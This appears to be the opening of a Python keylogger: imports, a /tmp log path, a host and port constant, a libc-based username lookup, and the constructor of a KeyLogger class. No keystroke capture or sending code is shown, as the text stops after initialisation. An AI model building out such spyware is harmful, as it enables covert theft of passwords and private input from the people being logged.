import ctypes
import ctypes.util
import threading
import sqlite3
import os
import socket
import sys
import time
import json
import shelve
import logging

LOG_DEFAULT_PATH = '/tmp/'
HOST = '127.0.0.1'
PORT = 1234

def get_username():
    libcpath = ctypes.util.find_library('c')
    libc = ctypes.CDLL(libcpath)
    getlogin_func = libc.getlogin
    getlogin_func.restype = ctypes.c_char_p
    return getlogin_func()

class KeyLogger:
    """
    Main object for our keylogger
    """
    def __init__(self, host, port, db_name, log_path=LOG_DEFAULT_PATH):
        self.host = host
        self.port = port
        self.db_name = db_name
        self.log_path = log_path
        self.key_log = {}
        self.log_file = None
        self.is_running = False
        self.log_username = get_username()
